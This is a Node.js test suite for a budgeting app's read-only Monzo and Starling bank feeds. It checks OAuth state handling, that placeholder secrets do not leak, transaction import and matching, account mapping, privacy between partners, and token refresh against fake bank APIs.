// Run with: node test/bank.test.js
// Read-only bank feeds (apps-script/BankFeeds.gs) against a fake Monzo and a fake Starling built from their documented shapes.
const makeEnv = require("./fake-gas.js"), fixture = require("./fixture.js"), B = require("../engine.js");
const vm = require("vm"), fs = require("fs"), path = require("path");
const SRC = fs.readFileSync(path.join(__dirname, "../apps-script/BankFeeds.gs"), "utf8");
let fails = 0, passes = 0;
const ok = (name, cond, extra) => { cond ? passes++ : fails++; if (!cond) console.log("FAIL", name, extra !== undefined ? JSON.stringify(extra).slice(0, 600) : ""); };
const near = (name, got, want) => ok(name, Math.abs(got - want) < 0.011, {got, want});

// ---------- secrets the fakes hand out (none may ever appear outside Script Properties) ----------
const SECRET = {clientSecret: "mnzconf.SECRET-ethan-xyz987", code: "code-abc123-secret", access1: "acc-ETHAN-1-aaaaaaaa", refresh1: "ref-ETHAN-1-bbbbbbbb", access2: "acc-ETHAN-2-cccccccc", refresh2: "ref-ETHAN-2-dddddddd",
  starling: "sl-TOKEN-sophie-0123456789abcdef", starlingWrite: "sl-TOKEN-WRITE-0123456789abcdef", starlingThin: "sl-TOKEN-THIN-0123456789abcdef",
  starlingPayee: "sl-TOKEN-PAYEE-0123456789abcdef", starlingOdd: "sl-TOKEN-ODD-0123456789abcdef0", starlingSpaces: "sl-TOKEN-SPACES-0123456789abcdef"};
const CLIENT_ID = "oauth2client_00009ETHAN";

// ---------- a fixed clock (Tue 17 Nov 2026, midday) ----------
const RealDate = Date; let NOW = RealDate.parse("2026-11-17T12:00:00Z");
class FakeDate extends RealDate { constructor(...a) { if (a.length) super(...a); else super(NOW); } static now() { return NOW; } static [Symbol.hasInstance](x) { return x instanceof RealDate; } }

// ---------- fake Monzo ----------
const iso = (d, t) => d + "T" + (t || "10:00:00") + ".000Z";
const monzo = {
  approved: false, tokens: {}, refreshes: {}, revoked: false, rate: false, history: [],
  accounts: [{id: "acc_00009main", description: "user_00009ETHAN", type: "uk_retail", closed: false, created: "2021-01-01T00:00:00Z"}],
  pots: [{id: "pot_bills", name: "Bills & Rent", style: "beach_ball", balance: 15000, currency: "GBP", deleted: false}, {id: "pot_food", name: "Food", balance: 4500, currency: "GBP", deleted: false}, {id: "pot_gone", name: "Old", balance: 0, deleted: true}],
  balance: {balance: 54321, total_balance: 73821, currency: "GBP", spend_today: 0},
  txns: []
};
const mtx = (id, date, minor, extra) => Object.assign({id: id, created: iso(date, extra && extra.time), settled: extra && extra.pending ? "" : iso(date, "23:00:00"), amount: minor, currency: "GBP", description: "", category: "general", metadata: {}, notes: "", is_load: false, merchant: null}, extra || {});
const merchant = (name, category) => ({id: "merch_" + name.replace(/\W/g, ""), name: name, category: category, logo: "", emoji: "", address: {city: "Exampletown"}});
function monzoData(planned) {
  const list = [];
  for (let i = 0; i < 150; i++) list.push(mtx("tx_hist" + String(i).padStart(3, "0"), "2026-09-" + String(1 + (i % 28)).padStart(2, "0"), -250, {merchant: merchant("Coffee Place", "eating_out"), category: "eating_out", time: "08:" + String(i % 60).padStart(2, "0") + ":00"}));
  list.push(
    mtx("tx_pay", "2026-10-29", 239000, {counterparty: {name: "PAYROLL LTD", sort_code: "000000"}, category: "income", time: "06:00:00"}),
    mtx("tx_potbills", "2026-10-29", -Math.round(planned.bills * 100), {description: "pot_bills", category: "savings", metadata: {pot_id: "pot_bills"}, time: "09:00:00"}),
    mtx("tx_potfood", "2026-10-29", -Math.round(planned.food * 100), {description: "pot_food", category: "savings", metadata: {pot_id: "pot_food"}, time: "09:01:00"}),
    mtx("tx_moneybox", "2026-10-30", -30000, {counterparty: {name: "Moneybox"}, category: "savings", description: "MONEYBOX"}),
    mtx("tx_tesco", "2026-11-01", -4520, {merchant: merchant("Tesco", "groceries"), category: "groceries"}),
    mtx("tx_deliveroo", "2026-11-01", -1800, {merchant: merchant("Deliveroo", "eating_out"), category: "eating_out"}),
    mtx("tx_sainsburys", "2026-11-01", -6240, {merchant: merchant("Sainsbury's", "groceries"), category: "groceries"}),
    mtx("tx_sophie_bills", "2026-11-01", 14000, {counterparty: {name: "SOPHIE"}, category: "transfers"}),
    mtx("tx_flatbills", "2026-11-02", -47210, {counterparty: {name: "HOUSEHOLD BILLS LTD"}, category: "bills", description: "HOUSEHOLD BILLS"}),
    mtx("tx_bakery", "2026-11-02", -1250, {merchant: merchant("Bakery Co", "eating_out"), category: "eating_out"}),
    mtx("tx_shell", "2026-11-02", -3000, {merchant: merchant("Shell", "transport"), category: "transport", pending: true}),
    mtx("tx_declined", "2026-11-02", -999, {merchant: merchant("Netflix", "entertainment"), decline_reason: "INSUFFICIENT_FUNDS"}),
    mtx("tx_refund", "2026-11-03", 500, {merchant: merchant("Tesco", "groceries"), category: "groceries"}),
    mtx("tx_phone", "2026-11-05", -2000, {merchant: merchant("Phone Co", "bills"), category: "bills"}),
    mtx("tx_friend", "2026-11-06", -2000, {counterparty: {name: "SAM SMITH"}, category: "general"}),
    mtx("tx_rent", "2026-11-16", -120000, {counterparty: {name: "LANDLORD LTD"}, category: "bills"})
  );
  return list;
}
function monzoRoute(method, url, params) {
  const u = new URL(url), q = u.searchParams, auth = (params.headers || {}).Authorization || "", tok = auth.replace(/^Bearer /, "");
  const send = (code, body, headers) => ({code, body: JSON.stringify(body), headers: headers || {}});
  if (u.pathname === "/oauth2/token") {
    const f = params.payload || {};
    if (monzo.tokenDown) return send(503, {code: "internal_service"});
    if (f.client_id !== CLIENT_ID || f.client_secret !== SECRET.clientSecret) return send(401, {code: "unauthorized.bad_client"});
    if (f.grant_type === "authorization_code") { if (f.code !== SECRET.code || f.redirect_uri !== "https://script.google.com/macros/s/TEST/exec") return send(400, {code: "bad_request"}); monzo.tokens[SECRET.access1] = true; monzo.refreshes[SECRET.refresh1] = SECRET.access2; return send(200, {access_token: SECRET.access1, refresh_token: SECRET.refresh1, expires_in: 21600, user_id: "user_00009ETHAN", client_id: CLIENT_ID, token_type: "Bearer"}); }
    if (f.grant_type === "refresh_token") { const next = monzo.refreshes[f.refresh_token]; if (!next) return send(401, {code: "unauthorized.bad_refresh_token"}); delete monzo.refreshes[f.refresh_token]; monzo.tokens[next] = true; const nextRef = f.refresh_token === SECRET.refresh1 ? SECRET.refresh2 : "ref-ETHAN-3-ffffffff"; monzo.refreshes[nextRef] = f.refresh_token === SECRET.refresh1 ? "acc-ETHAN-3-eeeeeeee" : "acc-ETHAN-4-gggggggg"; return send(200, {access_token: next, refresh_token: nextRef, expires_in: 21600, user_id: "user_00009ETHAN", client_id: CLIENT_ID, token_type: "Bearer"}); }
    return send(400, {});
  }
  if (u.pathname === "/oauth2/logout") { if (!monzo.tokens[tok]) return send(401, {code: "unauthorized.bad_access_token"}); delete monzo.tokens[tok]; return send(200, {}); }
  if (!monzo.tokens[tok]) return send(401, {code: "unauthorized.bad_access_token"});
  if (monzo.rate) return send(429, {code: "too_many_requests"}, {"Retry-After": monzo.retryAfter || "120"});
  if (!monzo.approved) return send(403, {code: "forbidden.insufficient_permissions", message: "Access forbidden due to insufficient permissions"});
  // after the first few minutes Monzo only gives the last 90 days
  // a slow page (pageDelay), and Monzo's 5 minutes running out after a few pages (closeAfter)
  if (u.pathname === "/transactions") { monzo.txCalls = (monzo.txCalls || 0) + 1; if (monzo.pageDelay) NOW += monzo.pageDelay; if (monzo.closeAfter && monzo.txCalls > monzo.closeAfter) { monzo.historyClosed = true; monzo.strictCursor = true; } }
  // strictCursor: carrying on from an old payment's id is refused too
  const oldId = (sn) => { const t = monzo.txns.find(x => x.id === sn); return !!t && (NOW - RealDate.parse(t.created)) > 90 * 86400000; };
  if (monzo.historyClosed && u.pathname === "/transactions") { const sn = q.get("since"); if (!sn || (/^tx_/.test(sn) ? monzo.strictCursor && oldId(sn) : (NOW - RealDate.parse(sn)) > 90 * 86400000)) return send(403, {code: "forbidden.verification_required"}); }
  if (u.pathname === "/ping/whoami") return send(200, {authenticated: true, client_id: CLIENT_ID, user_id: "user_00009ETHAN"});
  if (u.pathname === "/accounts") return send(200, {accounts: monzo.accounts});
  if (u.pathname === "/balance") return q.get("account_id") === "acc_00009main" ? send(200, monzo.balance) : send(404, {});
  if (u.pathname === "/pots") return send(200, {pots: monzo.pots});
  if (u.pathname === "/transactions") {
    let list = monzo.txns.slice().sort((a, b) => a.created < b.created ? -1 : 1);
    const since = q.get("since"), limit = Math.min(100, +q.get("limit") || 30);
    if (since && /^tx_/.test(since)) { const i = list.findIndex(t => t.id === since); list = list.slice(i + 1); }
    else if (since) list = list.filter(t => t.created > since);
    // a merchant comes back as an id unless expanded
    const expand = q.getAll("expand[]").indexOf("merchant") >= 0;
    return send(200, {transactions: list.slice(0, limit).map(t => expand ? t : Object.assign({}, t, {merchant: t.merchant ? t.merchant.id : null}))});
  }
  return send(404, {code: "not_found"});
}

// ---------- fake Starling ----------
const starling = {
  rate: false,
  identity: {[SECRET.starling]: ["account:read", "account-list:read", "balance:read", "transaction:read", "savings-goal:read"], [SECRET.starlingWrite]: ["account:read", "account-list:read", "balance:read", "transaction:read", "pay-local:create"], [SECRET.starlingThin]: ["account:read", "balance:read"]},
  accounts: [{accountUid: "sacc-0001", accountType: "PRIMARY", defaultCategory: "scat-0001", currency: "GBP", createdAt: "2026-06-01T09:00:00.000Z", name: "Personal"}],
  goals: [{savingsGoalUid: "goal-rent", name: "Rent & bills", target: {currency: "GBP", minorUnits: 100000}, totalSaved: {currency: "GBP", minorUnits: 52500}, savedPercentage: 52, state: "ACTIVE"}, {savingsGoalUid: "goal-savings", name: "Savings", totalSaved: {currency: "GBP", minorUnits: 12000}, state: "ACTIVE"}],
  feed: []
};
const sfi = (id, date, minor, dir, extra) => Object.assign({feedItemUid: id, categoryUid: "scat-0001", amount: {currency: "GBP", minorUnits: minor}, sourceAmount: {currency: "GBP", minorUnits: minor}, direction: dir,
  updatedAt: iso(date, "12:00:00"), transactionTime: iso(date), settlementTime: iso(date, "11:00:00"), source: "MASTER_CARD", status: "SETTLED", counterPartyType: "MERCHANT", counterPartyName: "", reference: "", country: "GB", spendingCategory: "GENERAL"}, extra || {});
starling.feed = [
  sfi("sfi-aldi", "2026-11-02", 2310, "OUT", {counterPartyName: "Aldi", spendingCategory: "GROCERIES"}),
  sfi("sfi-private", "2026-11-03", 4999, "OUT", {counterPartyName: "Private Shop", spendingCategory: "SHOPPING"}),
  sfi("sfi-refund", "2026-11-04", 500, "IN", {counterPartyName: "Aldi", spendingCategory: "GROCERIES"}),
  sfi("sfi-declined", "2026-11-04", 1500, "OUT", {counterPartyName: "Cinema", status: "DECLINED"}),
  sfi("sfi-goal", "2026-11-05", 5000, "OUT", {source: "INTERNAL_TRANSFER", counterPartyType: "CATEGORY", counterPartyUid: "goal-savings", counterPartyName: "Savings"}),
  sfi("sfi-rentshare", "2026-11-13", 50000, "OUT", {source: "FASTER_PAYMENTS_OUT", counterPartyType: "PAYEE", counterPartyName: "Sam Smith", reference: "Rent"}),
  sfi("sfi-upcoming", "2026-11-20", 1999, "OUT", {status: "UPCOMING", counterPartyName: "Future"})
];
function starlingRoute(method, url, params) {
  const u = new URL(url), q = u.searchParams, tok = ((params.headers || {}).Authorization || "").replace(/^Bearer /, "");
  const send = (code, body, headers) => ({code, body: JSON.stringify(body), headers: headers || {}});
  const scopes = starling.identity[tok];
  if (!scopes) return send(401, {error: "invalid_token"});
  if (starling.rate) return send(429, {}, {"Retry-After": "60"});
  if (u.pathname === "/api/v2/identity/token") return send(200, {accessTokenUid: "atok-1", applicationUserUid: "app-user-1", accountHolderUid: "holder-1", scopes: scopes, authenticated: true, expiresInSeconds: 0});
  if (u.pathname === "/api/v2/accounts") return send(200, {accounts: starling.accounts});
  if (u.pathname === "/api/v2/accounts/sacc-0001/balance") return send(200, {clearedBalance: {currency: "GBP", minorUnits: 18000}, effectiveBalance: {currency: "GBP", minorUnits: 17500}, pendingTransactions: {currency: "GBP", minorUnits: 500}, acceptedOverdraft: {currency: "GBP", minorUnits: 0}, amount: {currency: "GBP", minorUnits: 17500}});
  if (u.pathname === "/api/v2/account/sacc-0001/savings-goals") return scopes.indexOf("savings-goal:read") >= 0 ? send(200, {savingsGoalList: starling.goals}) : send(403, {});
  if (u.pathname === "/api/v2/account/sacc-0001/spaces") return scopes.indexOf("space:read") >= 0 ? send(200, {savingsGoals: [], spendingSpaces: [{spaceUid: "space-fun", categoryUid: "scat-fun", name: "Fun money", balance: {currency: "GBP", minorUnits: 3000}}]}) : send(403, {errors: [{message: "Insufficient scope"}]});   // no space:read box ticked
  if (/\/category\/scat-fun\/transactions-between$/.test(u.pathname)) return send(200, {feedItems: starling.feed.filter(f => f.categoryUid === "scat-fun")});
  const m = u.pathname.match(/^\/api\/v2\/feed\/account\/sacc-0001\/category\/scat-0001\/transactions-between$/);
  if (m) { const a = q.get("minTransactionTimestamp"), b = q.get("maxTransactionTimestamp"); return send(200, {feedItems: starling.feed.filter(f => f.categoryUid !== "scat-fun" && f.transactionTime >= a && f.transactionTime < b)}); }
  return send(404, {});
}

// ---------- the sheet, with the bank feed code and the fakes ----------
const reqs = [], responses = [];
function bankEnv(mut) {
  const env = makeEnv(), c = env.ctx;
  c.Date = FakeDate;
  const L = () => ({waitLock: () => {}, tryLock: () => true, releaseLock: () => {}, hasLock: () => true});
  c.LockService = {getScriptLock: L, getDocumentLock: L, getUserLock: L};
  env.mail = []; c.MailApp = {sendEmail: (o) => { env.mail.push(o); }};
  c.Session = {getEffectiveUser: () => ({getEmail: () => "owner@example.com"})};
  c.HtmlService = {createHtmlOutput: (h) => { const o = {html: h, setTitle: () => o, getContent: () => h}; return o; }};
  const fmt = c.Utilities.formatDate;
  c.Utilities.formatDate = (d, tz, f) => f === "yyyy-MM-dd" && tz ? new Intl.DateTimeFormat("en-CA", {timeZone: tz, year: "numeric", month: "2-digit", day: "2-digit"}).format(d) : fmt(d, tz, f);
  c.UrlFetchApp = {fetch: (url, params) => {
    params = params || {}; const method = String(params.method || "get").toLowerCase();
    reqs.push({method, url, headers: params.headers || {}, payload: params.payload, followRedirects: params.followRedirects});
    const host = new URL(url).host, r = host === "api.monzo.com" ? monzoRoute(method, url, params) : host === "api.starlingbank.com" ? starlingRoute(method, url, params) : {code: 599, body: "{}"};
    return {getResponseCode: () => r.code, getContentText: () => r.body, getHeaders: () => r.headers || {}};
  }};
  vm.runInContext(SRC, c, {filename: "BankFeeds.gs"});
  c.setup(); const fx = fixture(); if (mut) mut(fx);
  Object.keys(fx).forEach(t => { const sh = env.sheets[t]; if (!sh) return; const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]; fx[t].forEach(r => sh.appendRow(head.map(h => r[h] === undefined ? "" : r[h]))); });
  c.CACHE_ = {}; c.setup();
  const call = (b) => { c.CACHE_ = {}; const text = c.handle_(b).text; responses.push(text); return JSON.parse(text); };
  return {env, c, call, kE: env.props.KEY_ethan, kS: env.props.KEY_sophie};
}
const rows = (F, t) => { F.c.CACHE_ = {}; return F.c.readTable_(t).rows; };
const phone = (F, k) => { const P = {T: {}, since: 0}; P.sync = () => { const j = F.call({key: k, since: P.since, full: !P.since}); if (j.full) P.T = {}; Object.keys(j.rows).forEach(t => { P.T[t] = P.T[t] || []; j.rows[t].forEach(r => { const i = P.T[t].findIndex(x => (t === "meta" ? x.key === r.key : x.id === r.id)); if (i >= 0) P.T[t][i] = r; else P.T[t].push(r); }); }); P.since = j.now; return j; }; return P; };

// the household: Ethan has logged a bakery by hand; Peckish has posted a Sainsbury's shop; a rule for Deliveroo
const F = bankEnv(t => {
  t.transactions.push({id: "app-bakery", date: "2026-11-01", person: "ethan", amount: 12.5, budget: "e-fun", account: "e-main", note: "Bakery Co", source: "app"});
  t.settings.push({id: "ethan:bank.rule.deliveroo", person: "ethan", key: "bank.rule.deliveroo", value: "e-fun|half"});
});
const {c, call, kE, kS} = F;
// Peckish posts with a Budgie key, like the app
const pk = call({key: kE, ops: [{op: "put", table: "transactions", row: {id: "peckish-1", date: "2026-11-02", person: "ethan", amount: 62.4, budget: "e-food-b", account: "e-main", note: "Sainsbury's (Peckish)", source: "peckish"}}]});
ok("Peckish-style put still works", pk.ok && pk.applied.length === 1 && !pk.rejected.length, pk);
// what payday should move (from the engine, before any bank data)
const db0 = B.load(fixture(), "2026-10-29"), pd0 = B.payday(db0, "ethan", B.periodAt(db0, "ethan", "2026-10-29"));
const planned = {bills: pd0.moves.find(m => m.to === "e-bills").amount, food: pd0.moves.find(m => m.to === "e-food").amount};
monzo.txns = monzoData(planned);

// ================= who can act =================
ok("bank actions need a key", call({action: "bank.status"}).ok === false);
ok("and the right one", call({key: "nope", action: "bank.status"}).ok === false);
const st0 = call({key: kE, action: "bank.status"});
ok("bank.status says which other apps are linked, and the key type", JSON.stringify(call({key: kE, action: "bank.status"}).apps) === JSON.stringify({peckish: false, caledonite: false}) && call({key: kE, action: "bank.status"}).keyType === "full");
ok("status before anything", st0.ok && st0.bank.provider === "" && st0.bank.needsSetup === true && st0.bank.connected === false && Array.isArray(st0.bank.accounts), st0);
ok("unknown bank action refused", call({key: kE, action: "bank.pots.deposit"}).ok === false);

// ================= Monzo: client and sign in =================
ok("bad client id refused", call({key: kE, action: "bank.monzo.setClient", clientId: "nope", clientSecret: "x"}).ok === false);
ok("auth url needs a client first", call({key: kE, action: "bank.monzo.authUrl"}).ok === false);
ok("client saved", call({key: kE, action: "bank.monzo.setClient", clientId: CLIENT_ID, clientSecret: SECRET.clientSecret}).ok === true);
ok("client secret only in the owner's User Properties", JSON.stringify(F.env.userProps.BANK_CLIENT_ethan).indexOf(SECRET.clientSecret) >= 0 && !Object.values(F.env.props).some(v => v.indexOf(SECRET.clientSecret) >= 0));
ok("the owner is told", F.env.mail.some(m => m.to === "owner@example.com" && /Ethan's bank connection/.test(m.subject) && /Monzo app details were added/.test(m.body)) && F.env.mail.every(m => m.body.indexOf(SECRET.clientSecret) < 0));
const au = call({key: kE, action: "bank.monzo.authUrl"}), aurl = new URL(au.url);
const state = aurl.searchParams.get("state");
ok("auth url", au.ok && aurl.origin === "https://auth.monzo.com" && aurl.searchParams.get("client_id") === CLIENT_ID && aurl.searchParams.get("response_type") === "code" && aurl.searchParams.get("redirect_uri") === "https://script.google.com/macros/s/TEST/exec" && state.length >= 32, au.url);
ok("auth url has no secret", au.url.indexOf(SECRET.clientSecret) < 0);
const cb = (q) => { const o = c.doGet({parameter: q}); const h = o.getContent ? o.getContent() : o.text; responses.push(h); return h; };
// a made-up state, then a real one that has expired
let html = cb({code: SECRET.code, state: "made-up-state"});
ok("a state that isn't Budgie's shape is turned away at once", /The app talks to this with POST/.test(html) && !F.env.userProps.BANK_TOKEN_ethan);
html = cb({code: SECRET.code, state: "a".repeat(64)});
ok("wrong state aborts", /expired or didn't come from Budgie/.test(html) && !F.env.userProps.BANK_TOKEN_ethan);
const au2 = call({key: kE, action: "bank.monzo.authUrl"}), st2 = new URL(au2.url).searchParams.get("state");
ok("only one sign-in waits per person", !F.env.userProps["BANK_OAUTH_" + state] && !!F.env.userProps["BANK_OAUTH_" + st2]);
NOW += 11 * 60000; html = cb({code: SECRET.code, state: st2}); NOW -= 11 * 60000;
ok("an expired state aborts", /expired/.test(html) && !F.env.userProps.BANK_TOKEN_ethan);
ok("a used state is gone", !F.env.userProps["BANK_OAUTH_" + st2]);
const au3 = call({key: kE, action: "bank.monzo.authUrl"}), state3 = new URL(au3.url).searchParams.get("state");
// Sophie can't finish Ethan's sign-in with her own state either: states are tied to the person who asked
ok("an old state stops working once a new one is asked for", /expired/.test(cb({code: SECRET.code, state: state})) && !F.env.userProps.BANK_TOKEN_ethan);
html = cb({code: SECRET.code, state: state3});
ok("callback page", /Budgie is connected to Monzo\. You can close this tab\./.test(html), html);
ok("page doesn't echo the code", html.indexOf(SECRET.code) < 0 && html.indexOf(SECRET.access1) < 0);
ok("tokens stored for Ethan only", F.env.userProps.BANK_TOKEN_ethan && !F.env.userProps.BANK_TOKEN_sophie && F.env.userProps.BANK_TOKEN_ethan.indexOf(SECRET.access1) >= 0);
ok("state can't be used twice", /expired/.test(cb({code: SECRET.code, state: state3})));
ok("connecting tells the owner", F.env.mail.some(m => /Monzo was connected/.test(m.body)));
ok("client details can't be changed while connected", /Disconnect Monzo first/.test(call({key: kE, action: "bank.monzo.setClient", clientId: "oauth2client_000OTHER", clientSecret: "mnzconf.other"}).error));
let s = call({key: kE, action: "bank.status"}).bank;
ok("waiting for approval in the Monzo app", s.provider === "monzo" && s.waitingForApproval && !s.needsReconnect, s);
ok("a minute trigger waits for the approval", F.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"));
// Ethan approves in the Monzo app; the minute trigger imports everything (history needs two pages)
monzo.approved = true; NOW += 60000;
c.bankPendingImports();
s = call({key: kE, action: "bank.status"}).bank;
ok("connected", s.connected && !s.waitingForApproval && !s.needsSetup && s.lastSync === NOW && !s.lastError, s);
ok("minute trigger removed", !F.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports"));
ok("re-approve within 90 days", s.reapproveBy === "2027-02-15", s.reapproveBy);
ok("accounts listed (deleted pot left out)", JSON.stringify(s.accounts.map(a => [a.extId, a.kind, a.balance, a.mappedTo])) === JSON.stringify([["acc_00009main", "main", 543.21, null], ["pot_bills", "pot", 150, null], ["pot_food", "pot", 45, null]]), s.accounts);
const histReq = reqs.filter(r => /\/transactions\?/.test(r.url));
ok("full history on the first import (two pages, no 'since' date)", histReq.length >= 2 && !/since=20/.test(histReq[0].url) && /since=tx_/.test(histReq[1].url), histReq.map(r => r.url));
let tx = rows(F, "transactions");
const bk = (id) => tx.find(r => r.id === "bk-monzo-" + id);
ok("history imported, not for review", tx.filter(r => /^bk-monzo-tx_hist/.test(r.id)).length === 150 && tx.filter(r => /^bk-monzo-tx_hist/.test(r.id)).every(r => r.review === false));
ok("history guessed against budget names", bk("tx_hist000").budget === "e-fun" && bk("tx_hist000").amount === 2.5 && bk("tx_hist000").date === "2026-09-01");
const tesco = bk("tx_tesco");
ok("a payment", tesco && tesco.amount === 45.2 && tesco.date === "2026-11-01" && tesco.person === "ethan" && tesco.account === "e-main" && tesco.note === "Tesco" && tesco.source === "monzo" && tesco.bankId === "tx_tesco" && tesco.review === true && tesco.by === "bank", tesco);
ok("guessed from Monzo's category", tesco.budget === "e-food-b");
ok("a rule from a correction sets the budget; its split is only a hint until confirmed", bk("tx_deliveroo").budget === "e-fun" && bk("tx_deliveroo").split === "" && bk("tx_deliveroo").splitHint === "half" && bk("tx_deliveroo").review === true, bk("tx_deliveroo"));
ok("a refund is a negative payment", bk("tx_refund").amount === -5 && bk("tx_refund").budget === "e-food-b");
ok("pending payment imported", bk("tx_shell").amount === 30 && bk("tx_shell").budget === "e-fuel");
ok("declined payment skipped", !bk("tx_declined"));
ok("a payment to someone, nothing guessed", bk("tx_friend") && bk("tx_friend").budget === "" && bk("tx_friend").note === "SAM SMITH");
ok("the hand-logged bakery is linked, not added again", !bk("tx_bakery") && tx.find(r => r.id === "app-bakery").bankId === "tx_bakery" && tx.find(r => r.id === "app-bakery").review === false);
ok("the Peckish shop is linked, not added again", !bk("tx_sainsburys") && tx.find(r => r.id === "peckish-1").bankId === "tx_sainsburys" && tx.find(r => r.id === "peckish-1").review === true);   // a Peckish estimate still asks the payer to check it
ok("rent and the card-paid phone bill aren't payments (they're planned bills)", !bk("tx_rent") && !bk("tx_phone"));
ok("money in from Sophie isn't spending", !bk("tx_sophie_bills") && !bk("tx_pay"));
let ex = rows(F, "exceptions");
ok("pay came in at a different amount", (ex.find(x => x.id === "x-e-pay-2026-10-29-bank-ethan") || {}).amount === 2390, ex);
ok("the household bills came to £472.10", (ex.find(x => x.id === "x-e-flat-2026-11-01-bank-ethan") || {}).amount === 472.1, ex);
let mv = rows(F, "moves");
ok("pot moves wait for the pots to be mapped", !mv.some(m => m.id === "bk-monzo-tx_potbills"));
const mb = mv.find(m => m.id === "bk-monzo-tx_moneybox");
ok("Moneybox matches the payday LISA move and ticks it", mb && mb.key === "pay:2026-10-29:e-lisa" && mb.to === "e-lisa" && mb.from === "e-main" && mb.amount === 300 && mb.date === "2026-10-29" && mb.review === false, mb);
let val = rows(F, "valuations");
ok("today's main balance", (val.find(v => v.id === "bk-acc_00009main-2026-11-17") || {}).amount === 543.21 && val.find(v => v.id === "bk-acc_00009main-2026-11-17").note === "from Monzo" && val.find(v => v.id === "bk-acc_00009main-2026-11-17").account === "e-main");
ok("no balance for unmapped pots", !val.some(v => /pot_/.test(v.id)));

// ================= mapping =================
ok("map refuses a partner's account", call({key: kE, action: "bank.map", extId: "pot_bills", account: "s-main"}).ok === false);
ok("map refuses an account that isn't yours at the bank", call({key: kE, action: "bank.map", extId: "goal-rent", account: "e-bills"}).ok === false);
ok("map the Bills pot", call({key: kE, action: "bank.map", extId: "pot_bills", account: "e-bills"}).ok === true);
ok("ignore the Food pot", call({key: kE, action: "bank.map", extId: "pot_food", account: ""}).ok === true);
const setRow = rows(F, "settings").find(r => r.id === "ethan:bank.map.pot_bills");
ok("mapping is a settings row", setRow && setRow.person === "ethan" && setRow.key === "bank.map.pot_bills" && setRow.value === "e-bills");
s = call({key: kE, action: "bank.status"}).bank;
ok("status shows the mapping", s.accounts.find(a => a.extId === "pot_bills").mappedTo === "e-bills" && s.accounts.find(a => a.extId === "pot_food").mappedTo === "", s.accounts);
const before = rows(F, "transactions").length;
NOW += 15 * 60000;
let sn = call({key: kE, action: "bank.syncNow"});
ok("sync now", sn.ok && typeof sn.added === "number" && typeof sn.updated === "number", sn);
mv = rows(F, "moves");
const pb = mv.find(m => m.id === "bk-monzo-tx_potbills");
ok("payday move to the Bills pot ticks itself", pb && pb.key === "pay:2026-10-29:e-bills" && pb.from === "e-main" && pb.to === "e-bills" && Math.abs(pb.amount - planned.bills) < 0.005 && pb.date === "2026-10-29", pb);
ok("ignored pot: no move", !mv.some(m => m.id === "bk-monzo-tx_potfood"));
ok("running again adds nothing twice", rows(F, "transactions").length === before && rows(F, "exceptions").length === ex.length);
ok("Bills pot balance now kept", (rows(F, "valuations").find(v => v.id === "bk-pot_bills-2026-11-17") || {}).amount === 150);
const dbE = B.load((() => { c.CACHE_ = {}; return c.allTables_(); })(), "2026-11-17");
ok("the engine sees the payday moves as done", B.todo(dbE, "ethan", "2026-11-17").filter(x => x.payday && (x.to === "e-bills" || x.to === "e-lisa")).length === 0);

// ================= pending settles, confirmed rows stay as you left them =================
call({key: kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_tesco", budget: "e-fun", note: "Tesco (party food)", review: false}}]});
const sh = monzo.txns.find(t => t.id === "tx_shell"); sh.settled = iso("2026-11-03"); sh.amount = -2850;
const tsc = monzo.txns.find(t => t.id === "tx_tesco"); tsc.amount = -4600;
NOW += 15 * 60000; c.bankPoll();
tx = rows(F, "transactions");
ok("pending payment settled at a new amount", bk("tx_shell").amount === 28.5);
ok("a confirmed payment keeps your budget and note", bk("tx_tesco").budget === "e-fun" && bk("tx_tesco").note === "Tesco (party food)" && bk("tx_tesco").review === false && bk("tx_tesco").amount === 46, bk("tx_tesco"));
const lastSince = new RealDate(decodeURIComponent((reqs.filter(r => /\/transactions\?/.test(r.url)).pop().url.match(/since=([^&]+)/) || [])[1] || ""));
ok("the poll only asks for the last 35 days", Math.round((NOW - lastSince) / 86400000) === 35, lastSince);

// ================= phones and privacy =================
const E = phone(F, kE), S = phone(F, kS); E.sync(); S.sync();
ok("Ethan's phone gets his bank rows", E.T.transactions.some(r => r.id === "bk-monzo-tx_friend" && r.by === "bank"));
ok("Sophie doesn't see the Deliveroo until Ethan confirms the split", !S.T.transactions.some(r => r.id === "bk-monzo-tx_deliveroo" && !r.deleted));
call({key: kE, ops: [{op: "put", table: "transactions", row: {id: "bk-monzo-tx_deliveroo", split: "half", review: false}}]}); S.sync();
ok("then she sees it, and not his private payments", S.T.transactions.some(r => r.id === "bk-monzo-tx_deliveroo" && r.split === "half") && !S.T.transactions.some(r => r.id === "bk-monzo-tx_friend" || r.id === "bk-monzo-tx_tesco"));
ok("Sophie doesn't get Ethan's pay", !S.T.exceptions.some(r => r.id === "x-e-pay-2026-10-29-bank-ethan"));
const sSo = call({key: kS, action: "bank.status"}).bank;
ok("Sophie's status is hers, not Ethan's", sSo.provider === "" && sSo.accounts.length === 0 && sSo.review === 0);
ok("Sophie can't map Ethan's pot", call({key: kS, action: "bank.map", extId: "pot_bills", account: "s-main"}).ok === false);
const dsc = call({key: kS, action: "bank.disconnect"});
ok("Sophie disconnecting doesn't touch Ethan's bank", dsc.ok && F.env.userProps.BANK_TOKEN_ethan && F.env.userProps.BANK_CLIENT_ethan);
// later bank rows reach the phone by delta sync
monzo.txns.push(mtx("tx_late", "2026-11-17", -799, {merchant: merchant("Boots", "personal_care"), category: "personal_care", time: "11:00:00"}));
NOW += 15 * 60000; c.bankPoll(); E.sync();
ok("a new payment reaches the phone on its next sync", E.T.transactions.some(r => r.id === "bk-monzo-tx_late" && r.review === true));
// Caledonite and the app load the same data with the engine
const dbP = B.load(E.T, "2026-11-17"), perP = B.periodAt(dbP, "ethan", "2026-11-17");
ok("engine views run on synced bank data", Array.isArray(B.coming(dbP, "ethan", "2026-11-17", 14)) && B.planFor(dbP, "ethan", perP).lines.length > 0 && !!B.budgetState(dbP, "ethan", perP)["e-fuel"]);
near("bank spending counts against the budget", B.budgetState(dbP, "ethan", perP)["e-fuel"].spent, 28.5);

// ================= tokens: refresh, 401/403, 429 =================
const tokE = () => JSON.parse(F.env.userProps.BANK_TOKEN_ethan);
delete monzo.tokens[SECRET.access1];   // the access token runs out early
NOW += 15 * 60000; c.bankPoll();
ok("an expired access token is refreshed", tokE().access === SECRET.access2 && tokE().refresh === SECRET.refresh2 && !call({key: kE, action: "bank.status"}).bank.needsReconnect);
